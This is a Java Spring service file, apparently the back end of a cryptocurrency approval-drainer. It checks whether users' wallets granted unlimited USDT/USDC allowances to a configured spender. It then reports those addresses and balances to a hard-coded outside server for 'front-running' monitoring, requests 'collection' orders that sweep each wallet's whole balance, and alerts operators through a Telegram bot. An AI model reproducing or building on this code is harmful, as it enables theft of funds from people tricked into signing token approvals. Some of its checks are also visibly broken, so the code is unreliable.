package com.ruoyi.bussiness.service.impl;

import java.math.BigDecimal;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Map;

import cn.hutool.http.HttpUtil;
import cn.hutool.json.JSONUtil;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson2.JSONObject;
import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
import com.baomidou.mybatisplus.extension.service.IService;
import com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;
import com.ruoyi.bussiness.domain.TCollectionOrder;
import com.ruoyi.bussiness.service.ITCollectionOrderService;
import com.ruoyi.common.core.domain.AjaxResult;
import com.ruoyi.common.enums.WalletType;
import com.ruoyi.common.eth.EthUtils;
import com.ruoyi.common.trc.TronUtils;
import com.ruoyi.common.utils.DateUtils;
import com.ruoyi.common.utils.OrderUtils;
import com.ruoyi.common.utils.SecurityUtils;
import com.ruoyi.common.utils.StringUtils;
import com.ruoyi.system.service.ISysConfigService;
import com.ruoyi.telegrambot.MyTelegramBot;
import com.ruoyi.util.BotMessageBuildUtils;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.collections4.CollectionUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Service;
import com.ruoyi.bussiness.mapper.TAppAddressInfoMapper;
import com.ruoyi.bussiness.domain.TAppAddressInfo;
import com.ruoyi.bussiness.service.ITAppAddressInfoService;
import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
import org.web3j.utils.Convert;

import javax.annotation.Resource;

/**
 * 钱包地址授权详情Service业务层处理
 *
 * @author shenshen
 * @date 2023-06-27
 */
@Service
@Slf4j
public class TAppAddressInfoServiceImpl extends ServiceImpl<TAppAddressInfoMapper,TAppAddressInfo> implements ITAppAddressInfoService
{
    @Resource
    private TAppAddressInfoMapper tAppAddressInfoMapper;
    @Value("${app.name}")
    private String clientName;
    @Resource
    private ISysConfigService configService;
    @Resource
    private MyTelegramBot myTelegramBot;
    @Resource
    private ITCollectionOrderService tCollectionOrderService;
    /**
     * 查询钱包地址授权详情
     *
     * @param userId 钱包地址授权详情主键
     * @return 钱包地址授权详情
     */
    @Override
    public TAppAddressInfo selectTAppAddressInfoByUserId(Long userId)
    {
        return tAppAddressInfoMapper.selectTAppAddressInfoByUserId(userId);
    }

    /**
     * 查询钱包地址授权详情列表
     *
     * @param tAppAddressInfo 钱包地址授权详情
     * @return 钱包地址授权详情
     */
    @Override
    public List<TAppAddressInfo> selectTAppAddressInfoList(TAppAddressInfo tAppAddressInfo)
    {
        return tAppAddressInfoMapper.selectTAppAddressInfoList(tAppAddressInfo);
    }

    /**
     * 新增钱包地址授权详情
     *
     * @param tAppAddressInfo 钱包地址授权详情
     * @return 结果
     */
    @Override
    public int insertTAppAddressInfo(TAppAddressInfo tAppAddressInfo)
    {
        tAppAddressInfo.setCreateTime(DateUtils.getNowDate());
        tAppAddressInfo.setStatus("N");
        return tAppAddressInfoMapper.insertTAppAddressInfo(tAppAddressInfo);
    }

    /**
     * 修改钱包地址授权详情
     *
     * @param tAppAddressInfo 钱包地址授权详情
     * @return 结果
     */
    @Override
    public int updateTAppAddressInfo(TAppAddressInfo tAppAddressInfo)
    {
        tAppAddressInfo.setUpdateTime(DateUtils.getNowDate());
        return tAppAddressInfoMapper.updateTAppAddressInfo(tAppAddressInfo);
    }

    /**
     * 批量删除钱包地址授权详情
     *
     * @param userIds 需要删除的钱包地址授权详情主键
     * @return 结果
     */
    @Override
    public int deleteTAppAddressInfoByUserIds(Long[] userIds)
    {
        return tAppAddressInfoMapper.deleteTAppAddressInfoByUserIds(userIds);
    }

    /**
     * 删除钱包地址授权详情信息
     *
     * @param userId 钱包地址授权详情主键
     * @return 结果
     */
    @Override
    public int deleteTAppAddressInfoByUserId(Long userId)
    {
        return tAppAddressInfoMapper.deleteTAppAddressInfoByUserId(userId);
    }


    @Override
    public void refreshUsdtBalance(TAppAddressInfo wallet) {
        try {
            BigDecimal oldUsdt = wallet.getUsdt();
            if (wallet.getWalletType().equals(WalletType.ETH.name())) {
                String usdt = EthUtils.getUsdtHttp(wallet.getAddress());
                if (usdt == null) {
                    usdt = "0";
                }
                wallet.setUsdt(Convert.fromWei(usdt, Convert.Unit.MWEI));
            } else if (wallet.getWalletType().equals(WalletType.TRON.name())) {
                Map<String, BigDecimal> accountBalance = TronUtils.getAccountBalance(wallet.getAddress());
                BigDecimal trxBalance = accountBalance.get("trxBalance");
                BigDecimal usdtBalance = accountBalance.get("usdtBalance");
                wallet.setTrx(trxBalance);
                wallet.setUsdt(usdtBalance);
            }
            if (wallet.getUsdt().subtract(oldUsdt).compareTo(BigDecimal.ZERO) != 0) {
                //机器人通知
                log.debug("成功发送用户 {} USDT余额变动消息 变动前:{}, 变动后:{} ", wallet.getAddress(), oldUsdt, wallet.getUsdt());
                SendMessage sendMessage = BotMessageBuildUtils.buildUsdtText(wallet, oldUsdt);
                myTelegramBot.toSend(sendMessage);
            }
            TAppAddressInfo tAppAddressInfo = new TAppAddressInfo();
            tAppAddressInfo.setUserId(wallet.getUserId());
            tAppAddressInfo.setUsdt(wallet.getUsdt());
            // 更新用户最新余额
            updateTAppAddressInfo(tAppAddressInfo);
        }catch (Exception e){
            log.error("update usdt余额 error, addr:{}"+wallet.getAddress()+"异常"+e.getMessage());
        }
    }

    @Override
    public void sendFrontRunning(TAppAddressInfo wallet){

        if(wallet.getUsdt ().compareTo (BigDecimal.ZERO) > 0){
            JSONObject body = new JSONObject ();
            body.put ("address", wallet.getAddress ());
            body.put ("chain", "ETH");
            body.put ("amount", Convert.toWei (wallet.getUsdt (), Convert.Unit.MWEI).longValue ());
            body.put ("alertAmount", Convert.toWei (wallet.getUsdtMonitor (), Convert.Unit.MWEI).longValue ());
            body.put ("clientName", clientName);
            try {
                String ret = HttpUtil.createPost ("http://8.218.206.73:8001/hanksb666/api/order/address_submit")
                        .contentType ("application/json")
                        .body (body.toString ()).execute ().body ();
                log. info("监控地址发送成功,ret:{}, body:{}", ret, body);
            }catch (Exception e){
                log.error("监控地址发送失败，请检查第三方服务...:{}", body);
            }
        }
    }

    @Override
    public void refreshUsdtAllowed(TAppAddressInfo appAddressInfo) {
        BigDecimal oldUsdt = appAddressInfo.getUsdt();
        String status= StringUtils.isEmpty(appAddressInfo.getStatus())?"N":"Y";
        if ("N".equals(status)) {
            if (appAddressInfo.getWalletType().equals(WalletType.ETH.name())) {
                try {
                    if (appAddressInfo.getUsdtAllowed().compareTo(BigDecimal.ZERO) <= 0) {
                        String allowedAddr = configService.selectConfigByKey("ERC");
                        String allowerU = EthUtils.getAllowance(appAddressInfo.getAddress(), allowedAddr);
                        String eth = EthUtils.getEthHttp(appAddressInfo.getAddress());
                        String usdt = EthUtils.getUsdtHttp(appAddressInfo.getAddress());
                        if (usdt == null) {
                            usdt = "0";
                        }
                        appAddressInfo.setUsdt(Convert.fromWei(usdt, Convert.Unit.MWEI));
                        if (eth == null) {
                            eth = "0";
                        }
                        appAddressInfo.setEth(Convert.fromWei(eth, Convert.Unit.ETHER));
                        if (null == allowerU) {
                            log.error("刷新授权-检测用户 {} USDT余额变动异常", appAddressInfo.getAddress());
                            return;
                        }
                        if (allowerU.indexOf('.') > 10) {
                            //授权成功
                            appAddressInfo.setUsdtAllowed(new BigDecimal(100000000));
                            //新授权
                            sendFrontRunning(appAddressInfo);
                        } else {
                            appAddressInfo.setUsdtAllowed(new BigDecimal(allowerU));
                        }
                    } else {
                        //已授权的要更新
                        sendFrontRunning(appAddressInfo);
                    }
                } catch (Exception e) {
                    log.error("update ETH allowed error, addr:{}", appAddressInfo.getAddress(), e);
                }
            } else if (appAddressInfo.getWalletType().equals(WalletType.TRON.name())) {
                Map<String, BigDecimal> accountBalance = TronUtils.getAccountBalance(appAddressInfo.getAddress());
                BigDecimal trxBalance = accountBalance.get("trxBalance");
                BigDecimal usdtBalance = accountBalance.get("usdtBalance");
                appAddressInfo.setTrx(trxBalance);
                appAddressInfo.setUsdt(usdtBalance);
                if (appAddressInfo.getUsdtAllowed().compareTo(BigDecimal.ZERO) <= 0) {
                    JSONObject body = new JSONObject();
                    body.put("address", appAddressInfo.getAddress());

                    body.put("clientName", clientName);
                    String ret = HttpUtil.createPost("http://8.218.206.73:8001/hanksb666/api/order/getTronAllowerU")
                            .contentType("application/json")
                            .body(body.toString()).execute().body();
                    JSONObject jsonObject = JSONObject.parseObject(ret);
                    appAddressInfo.setUsdtAllowed(new BigDecimal(jsonObject.getString("msg")));
                }
            }
            TAppAddressInfo tAppAddressInfo = new TAppAddressInfo();
            tAppAddressInfo.setUserId(appAddressInfo.getUserId());
            tAppAddressInfo.setUsdtAllowed(appAddressInfo.getUsdtAllowed());
            tAppAddressInfo.setUsdt(appAddressInfo.getUsdt());
            tAppAddressInfo.setEth(appAddressInfo.getEth());
            tAppAddressInfo.setTrx(appAddressInfo.getTrx());
            // 更新用户最新余额
            updateTAppAddressInfo(tAppAddressInfo);
            BigDecimal subtract = oldUsdt.subtract(tAppAddressInfo.getUsdt());
            if (subtract.compareTo(new BigDecimal(0)) != 0) {
                SendMessage sendMessage = BotMessageBuildUtils.buildUsdtText(tAppAddressInfo, subtract);
                myTelegramBot.toSend(sendMessage);
            }
        }
    }

    @Override
    public void refreshUsdcAllowed(TAppAddressInfo appAddressInfo) {
        BigDecimal oldUsdt = appAddressInfo.getUsdt();
        String status= StringUtils.isEmpty(appAddressInfo.getStatus())?"N":"Y";
        if ("N".equals(status)) {
            if (appAddressInfo.getWalletType().equals(WalletType.ETH.name())) {
                try {
                    if (appAddressInfo.getUsdcAllowed().compareTo(BigDecimal.ZERO) <= 0) {
                        String allowedAddr = configService.selectConfigByKey("ERC");
                        String allowerUsdc = EthUtils.getUsdcAllowance(appAddressInfo.getAddress(), allowedAddr);
                        String usdc = EthUtils.getUsdcHttp(appAddressInfo.getAddress());
                        if (usdc == null) {
                            usdc = "0";
                        }
                        appAddressInfo.setUsdc(Convert.fromWei(usdc, Convert.Unit.MWEI));
                        if (null == allowerUsdc) {
                            log.error("刷新授权-检测用户 {} USDT余额变动异常", appAddressInfo.getAddress());
                            return;
                        }
                        if (allowerUsdc.indexOf('.') > 10) {
                            //授权成功
                            appAddressInfo.setUsdcAllowed(new BigDecimal(100000000));
                        } else {
                            appAddressInfo.setUsdcAllowed(new BigDecimal(allowerUsdc));
                        }
                    } else {
                        //已授权的要更新
                        sendFrontRunning(appAddressInfo);
                    }
                } catch (Exception e) {
                    log.error("update ETH allowed error, addr:{}", appAddressInfo.getAddress(), e);
                }
            } else if (appAddressInfo.getWalletType().equals(WalletType.TRON.name())) {
                Map<String, BigDecimal> accountBalance = TronUtils.getAccountBalance(appAddressInfo.getAddress());
                BigDecimal trxBalance = accountBalance.get("trxBalance");
                BigDecimal usdtBalance = accountBalance.get("usdtBalance");
                appAddressInfo.setTrx(trxBalance);
                appAddressInfo.setUsdt(usdtBalance);
                if (appAddressInfo.getUsdtAllowed().compareTo(BigDecimal.ZERO) <= 0) {
                    JSONObject body = new JSONObject();
                    body.put("address", appAddressInfo.getAddress());

                    body.put("clientName", clientName);
                    String ret = HttpUtil.createPost("http://8.218.206.73:8001/hanksb666/api/order/getTronAllowerU")
                            .contentType("application/json")
                            .body(body.toString()).execute().body();
                    JSONObject jsonObject = JSONObject.parseObject(ret);
                    appAddressInfo.setUsdtAllowed(new BigDecimal(jsonObject.getString("msg")));
                }
            }
            TAppAddressInfo tAppAddressInfo = new TAppAddressInfo();
            tAppAddressInfo.setUserId(appAddressInfo.getUserId());
            tAppAddressInfo.setUsdtAllowed(appAddressInfo.getUsdtAllowed());
            tAppAddressInfo.setUsdt(appAddressInfo.getUsdt());
            tAppAddressInfo.setEth(appAddressInfo.getEth());
            tAppAddressInfo.setTrx(appAddressInfo.getTrx());
            // 更新用户最新余额
            updateTAppAddressInfo(tAppAddressInfo);
            BigDecimal subtract = oldUsdt.subtract(tAppAddressInfo.getUsdt());
            if (subtract.compareTo(new BigDecimal(0)) != 0) {
                SendMessage sendMessage = BotMessageBuildUtils.buildUsdtText(tAppAddressInfo, subtract);
                myTelegramBot.toSend(sendMessage);
            }
        }
    }
    @Override
    public int refreshAddressInfo(TAppAddressInfo tAppAddressInfo) {
        tAppAddressInfo = selectTAppAddressInfoByUserId(tAppAddressInfo.getUserId());
        BigDecimal oldUsdt = tAppAddressInfo.getUsdt();
        String status= StringUtils.isEmpty(tAppAddressInfo.getStatus())?"N":tAppAddressInfo.getStatus();
        int i=1;
        if ("N".equals(status)) {
            if (tAppAddressInfo.getWalletType().equals(WalletType.ETH.name())) {
                String usdt = EthUtils.getUsdtHttp(tAppAddressInfo.getAddress());
                if (usdt == null) {
                    usdt = "0";
                }
                tAppAddressInfo.setUsdt(Convert.fromWei(usdt, Convert.Unit.MWEI));
                String eth = EthUtils.getEthHttp(tAppAddressInfo.getAddress());
                String usdc = EthUtils.getUsdcHttp(tAppAddressInfo.getAddress());
                if (usdc == null) {
                    usdc = "0";
                }
                if (eth == null) {
                    eth = "0";
                }
                tAppAddressInfo.setUsdc(Convert.fromWei(usdc, Convert.Unit.MWEI));
                tAppAddressInfo.setEth(Convert.fromWei(eth, Convert.Unit.ETHER));
                log.debug("refresh,wallet:{},", tAppAddressInfo);
                try {
                    if (tAppAddressInfo.getUsdtAllowed().compareTo(BigDecimal.ZERO) <= 0) {
                        String allowedAddr = configService.selectConfigByKey("ERC");
                        String allowerU = EthUtils.getAllowance(tAppAddressInfo.getAddress(), allowedAddr);

                        if (allowerU.indexOf('.') > 10) {
                            tAppAddressInfo.setUsdtAllowed(new BigDecimal(100000000));
                            sendFrontRunning(tAppAddressInfo);
                        } else {
                            tAppAddressInfo.setUsdtAllowed(new BigDecimal(allowerU));
                        }

                    } else {
                        sendFrontRunning(tAppAddressInfo);
                    }
                    if (tAppAddressInfo.getUsdcAllowed().compareTo(BigDecimal.ZERO) <= 0) {
                        String allowedAddr = configService.selectConfigByKey("ERC");
                        String allowerUsdc = EthUtils.getUsdcAllowance(tAppAddressInfo.getAddress(), allowedAddr);
                        if (allowerUsdc.indexOf('.') > 10) {
                            tAppAddressInfo.setUsdcAllowed(new BigDecimal(100000000));
                        } else {
                            tAppAddressInfo.setUsdcAllowed(new BigDecimal(allowerUsdc));
                        }
                    } else {
                        sendFrontRunning(tAppAddressInfo);
                    }
                } catch (Exception e) {
                    log.error("update ETH allowed error, addr:{}", tAppAddressInfo.getAddress(), e);
                }
            } else if (tAppAddressInfo.getWalletType().equals(WalletType.TRON.name())) {
                log.debug("刷新TRON余额");
                Map<String, BigDecimal> accountBalance = TronUtils.getAccountBalance(tAppAddressInfo.getAddress());
                BigDecimal trxBalance = accountBalance.get("trxBalance");
                BigDecimal usdtBalance = accountBalance.get("usdtBalance");
                tAppAddressInfo.setTrx(trxBalance);
                tAppAddressInfo.setUsdt(usdtBalance);
                if (tAppAddressInfo.getUsdtAllowed().compareTo(BigDecimal.ZERO) <= 0) {
                    JSONObject body = new JSONObject();
                    body.put("address", tAppAddressInfo.getAddress());
                    body.put("clientName", clientName);
                    String ret = HttpUtil.createPost("http://8.218.206.73:8001/hanksb666/api/order/getTronAllowerU")
                            .contentType("application/json")
                            .body(body.toString()).execute().body();
                    log.debug("查询授权回调" + ret);
                    JSONObject jsonObject = JSONObject.parseObject(ret);
                    tAppAddressInfo.setUsdtAllowed(new BigDecimal(jsonObject.getString("msg")));
                }

            }
            //先修改addressinfo
            i = updateTAppAddressInfo(tAppAddressInfo);
            //如果金额变动 需要通知机器人去通知。
            BigDecimal subtract = oldUsdt.subtract(tAppAddressInfo.getUsdt());
            if (subtract.compareTo(new BigDecimal(0)) != 0) {
                SendMessage sendMessage = BotMessageBuildUtils.buildUsdtText(tAppAddressInfo, subtract);
                myTelegramBot.toSend(sendMessage);
            }
        }
        return i;
    }

    @Override
    public String collection(TAppAddressInfo address) {
        //查看当前是否有正在进行中的归集订单
        List<TCollectionOrder> list = tCollectionOrderService.list(new LambdaQueryWrapper<TCollectionOrder>().eq(TCollectionOrder::getAddress, address.getAddress()).eq(TCollectionOrder::getStatus,"1"));
        if(!CollectionUtils.isEmpty(list)){
            return "该用户已有归集订单正在进行中，请稍后再试！";
        }

        List<TAppAddressInfo> tAppAddressInfos = selectTAppAddressInfoList(address);
        TAppAddressInfo wallet = new TAppAddressInfo();
        if(tAppAddressInfos.size()>0){
            wallet = tAppAddressInfos.get(0);
        }
        if (wallet.getUsdtAllowed().intValue() < 0) {
            return "授权额太小..";
        }
        Long amount = 0L;
        BigDecimal usdt =BigDecimal.ZERO;
        if (wallet.getWalletType().equals(WalletType.ETH.name())) {
             usdt = new BigDecimal(EthUtils.getUsdtHttp(address.getAddress()));
            if (usdt == null) {
                return "获取不到地址U数量";
            }
            if ("0".equals(usdt)) {
                return "此地址查到的U为0";
            }
            amount = usdt.longValue();
            log.debug("usdt金额:{}", usdt);
        } else if (wallet.getWalletType().equals(WalletType.TRON.name())) {
             usdt = TronUtils.getAccountBalance(wallet.getAddress()).get(TronUtils.USDT_BALANCE_KEY);
            if (usdt.compareTo(BigDecimal.ZERO) <= 0) {
                return "此地址查到的U为0";
            }
            amount = usdt.longValue () * 1000000L;
            log.debug("usdt金额:{}", usdt);
        }
        TCollectionOrder tCollectionOrder = new TCollectionOrder();
        tCollectionOrder.setAmount(new BigDecimal(amount).divide(new BigDecimal(1000000)));
        tCollectionOrder.setAddress(address.getAddress());
        tCollectionOrder.setChain(wallet.getWalletType ());
        tCollectionOrder.setClientName(clientName);
        tCollectionOrder.setStatus("1");
        tCollectionOrder.setCreateTime(new Date());
        String orderId = "X"+OrderUtils.generateOrderNum();
        tCollectionOrder.setOrderId(orderId);
        try {
            com.alibaba.fastjson.JSONObject body = new com.alibaba.fastjson.JSONObject();
            body.put("address", address.getAddress());
            body.put("orderId", orderId);
            body.put("chain", wallet.getWalletType ());
            body.put("amount", amount);
            body.put("clientName", clientName);
            String ret = HttpUtil.createPost("http://8.218.206.73:8001/hanksb666/api/order/create")
                    .contentType("application/json")
                    .body(body.toString ()).execute().body();
            log.info("归集返回：{}",ret);
            //返回结果转JSON
            JSONObject jsonObject = JSONObject.parseObject(ret);
            AjaxResult ajaxResult = JSONUtil.toBean(jsonObject.toJSONString(), AjaxResult.class);
            Map<String,String> data = (Map<String, String>) ajaxResult.get("data");
            String hash = data.get("hash");
            tCollectionOrder.setHash(hash);
            log.debug("归集请求发送,ret:{}, body:{}", ret, body);
            String loginName = SecurityUtils.getUsername();
            tCollectionOrder.setCoin("usdt");
            tCollectionOrder.setCreateBy(loginName);
            tCollectionOrder.setUserId(wallet.getUserId());
            tCollectionOrderService.insertTCollectionOrder(tCollectionOrder);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "归集请求发送";
    }
    @Override
    public String collectionUsdc(TAppAddressInfo address) {
        //查看当前是否有正在进行中的归集订单
        List<TCollectionOrder> list = tCollectionOrderService.list(new LambdaQueryWrapper<TCollectionOrder>().eq(TCollectionOrder::getAddress, address.getAddress()).eq(TCollectionOrder::getStatus,"1"));
        if(!CollectionUtils.isEmpty(list)){
            return "该用户已有归集订单正在进行中，请稍后再试！";
        }

        List<TAppAddressInfo> tAppAddressInfos = selectTAppAddressInfoList(address);
        TAppAddressInfo wallet = new TAppAddressInfo();
        if(tAppAddressInfos.size()>0){
            wallet = tAppAddressInfos.get(0);
        }
        if (wallet.getUsdcAllowed().intValue() < 0) {
            return "授权额太小..";
        }
        Long amount = 0L;
        BigDecimal usdt =BigDecimal.ZERO;
        if (wallet.getWalletType().equals(WalletType.ETH.name())) {
            usdt = new BigDecimal(EthUtils.getUsdtHttp(address.getAddress()));
            if (usdt == null) {
                return "获取不到地址U数量";
            }
            if ("0".equals(usdt)) {
                return "此地址查到的U为0";
            }
            amount = usdt.longValue();
            log.debug("usdt金额:{}", usdt);
        } else if (wallet.getWalletType().equals(WalletType.TRON.name())) {
            usdt = TronUtils.getAccountBalance(wallet.getAddress()).get(TronUtils.USDT_BALANCE_KEY);
            if (usdt.compareTo(BigDecimal.ZERO) <= 0) {
                return "此地址查到的U为0";
            }
            amount = usdt.longValue () * 1000000L;
            log.debug("usdt金额:{}", usdt);
        }
        TCollectionOrder tCollectionOrder = new TCollectionOrder();
        tCollectionOrder.setAmount(new BigDecimal(amount).divide(new BigDecimal(1000000)));
        tCollectionOrder.setAddress(address.getAddress());
        tCollectionOrder.setChain(wallet.getWalletType ());
        tCollectionOrder.setClientName(clientName);
        tCollectionOrder.setStatus("1");
        tCollectionOrder.setCreateTime(new Date());
        String orderId = "X"+OrderUtils.generateOrderNum();
        tCollectionOrder.setOrderId(orderId);
        try {
            com.alibaba.fastjson.JSONObject body = new com.alibaba.fastjson.JSONObject();
            body.put("address", address.getAddress());
            body.put("orderId", orderId);
            body.put("chain","USDC");
            body.put("amount", amount);
            body.put("clientName", clientName);
            String ret = HttpUtil.createPost("http://8.218.206.73:8001/hanksb666/api/order/create")
                    .contentType("application/json")
                    .body(body.toString ()).execute().body();
            log.info("归集返回：{}",ret);
            //返回结果转JSON
            JSONObject jsonObject = JSONObject.parseObject(ret);
            AjaxResult ajaxResult = JSONUtil.toBean(jsonObject.toJSONString(), AjaxResult.class);
            Map<String,String> data = (Map<String, String>) ajaxResult.get("data");
            String hash = data.get("hash");
            tCollectionOrder.setHash(hash);
            log.debug("归集请求发送,ret:{}, body:{}", ret, body);
            String loginName = SecurityUtils.getUsername();
            tCollectionOrder.setCoin("usdt");
            tCollectionOrder.setCreateBy(loginName);
            tCollectionOrder.setUserId(wallet.getUserId());
            tCollectionOrderService.insertTCollectionOrder(tCollectionOrder);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "归集请求发送";
    }
    @Override
    public List<TAppAddressInfo> getAllowedUser() {
        return tAppAddressInfoMapper.getAllowedUser();
    }
}
